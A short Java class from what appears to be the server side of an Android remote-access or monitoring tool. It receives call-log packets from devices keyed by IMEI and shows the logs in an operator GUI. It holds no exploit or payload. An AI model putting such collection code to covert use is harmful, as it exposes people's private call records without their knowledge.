package handler;

import gui.GUI;
import server.Server;
import Packet.CallLogPacket;
import Packet.Packet;

public class CallLogHandler implements PacketHandler {

	private GUI gui;
	private int channel;
	private String imei;
	
	public CallLogHandler(int chan, String imei, GUI gui) {
		channel = chan;
		this.imei = imei;
		this.gui = gui;
	}

	@Override
	public void receive(Packet p, String imei) {
		// TODO Auto-generated method stub
	}

	@Override
	public void handlePacket(Packet p, String temp_imei, Server c) {
		gui.logTxt("Call log data has been received");
		c.getChannelHandlerMap().get(imei).removeListener(channel);
		CallLogPacket packet = (CallLogPacket) p;
		gui.updateUserCallLogs(imei, packet.getList());
	}
}
